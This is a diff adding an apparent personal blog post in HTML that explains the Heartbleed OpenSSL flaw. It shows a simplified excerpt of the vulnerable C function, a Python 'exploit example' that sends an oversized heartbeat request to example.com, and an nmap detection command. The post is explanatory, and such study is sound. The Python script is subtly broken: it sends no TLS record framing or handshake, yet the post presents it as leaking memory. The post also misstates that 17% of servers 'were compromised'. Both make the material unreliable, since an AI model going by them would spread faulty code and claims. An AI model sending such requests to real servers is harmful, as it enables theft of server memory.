@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CVE-2014-0160 (Heartbleed) — Hem Parekh</title>
+<meta name="description" content="CVE-2014-0160 (Heartbleed)" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+<nav>
+  <div class="wrap">
+    <a href="../index.html" class="name">hem parekh</a>
+    <div class="links">
+      <a href="../findings.html">Findings</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../writing.html" class="active">Writing</a>
+      <a href="../about.html">About</a>
+      <a href="mailto:hemparekh1596@gmail.com">Contact</a>
+    </div>
+  </div>
+</nav>
+<article class="article wrap">
+  <a class="back" href="../writing.html">← Writing</a>
+  <div class="amTag">CVE</div>
+  <h1>CVE-2014-0160 (Heartbleed)</h1>
+  <div class="ameta">Sep 8, 2024 &middot; 3 min read</div>
+  <div class="prose">
+<h2>Understanding Heartbleed: A Technical Breakdown</h2>
+<p>
+          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
+        </p>
+<h3>Heartbeat Extension Basics</h3>
+<p>
+          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
+        </p>
+<ol>
+<li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
+<li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
+</ol>
+<p>
+          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
+        </p>
+<h3>Simplified Vulnerable Code</h3>
+<div class="code-block">
+<code>
+int tls1_process_heartbeat(SSL *s) {<br/>
+  unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0];<br/>
+  unsigned short payload;<br/>
+  unsigned char *buffer, *bp;<br/>
+  payload = (p[0] &lt;&lt; 8) | p[1];<br/>
+  buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br/>
+  bp = buffer;<br/>
+  *bp++ = TLS1_HB_RESPONSE;<br/>
+  memcpy(bp, p, payload); // Vulnerable<br/>
+  ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br/>
+  OPENSSL_free(buffer);<br/>
+}
+          </code>
+</div>
+<h2>How Heartbleed Works</h2>
+<p>
+          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
+        </p>
+<h3>Exploit Example in Python</h3>
+<div class="code-block">
+<code>
+import socket<br/>
+import struct<br/>
+def create_heartbeat_request():<br/>
+  hb_type = 1<br/>
+  payload = b"Hi"<br/>
+  payload_length = 0xFFFF<br/>
+  return struct.pack("&gt;BHH", hb_type, len(payload), payload_length) + payload<br/>
+def send_heartbeat_request(host, port):<br/>
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+  s.connect((host, port))<br/>
+  s.send(create_heartbeat_request())<br/>
+  response = s.recv(65535)<br/>
+  print("Leaked memory:", response)<br/>
+send_heartbeat_request("example.com", 443)
+          </code>
+</div>
+<h2>Global Chaos and Real-World Impact</h2>
+<p>
+          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
+        </p>
+<h2>Detecting Heartbleed</h2>
+<p>
+          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
+        </p>
+<div class="code-block">
+<code>
+nmap -p 443 --script ssl-heartbleed example.com
+          </code>
+</div>
+<h2>Lessons Learned</h2>
+<ul>
+<li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
+<li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
+<li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
+</ul>
+  </div>
+  <a class="back" style="margin-top:48px;display:inline-block" href="../writing.html">← All writing</a>
+</article>
+<footer class="wrap">
+  <h2>Have a bug, a role, or a hard parser to read? Get in touch.</h2>
+  <div class="links">
+    <a href="mailto:hemparekh1596@gmail.com">hemparekh1596@gmail.com</a>
+    <a href="https://github.com/Hem1700" target="_blank" rel="noopener">github</a>
+    <a href="https://linkedin.com/in/hem-parekh" target="_blank" rel="noopener">linkedin</a>
+  </div>
+  <div class="fine">&copy; 2026 Hem Parekh</div>
+</footer>
+<script>
+  const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add("in");io.unobserve(e.target)}})},{threshold:.12});
+  document.querySelectorAll(".reveal").forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
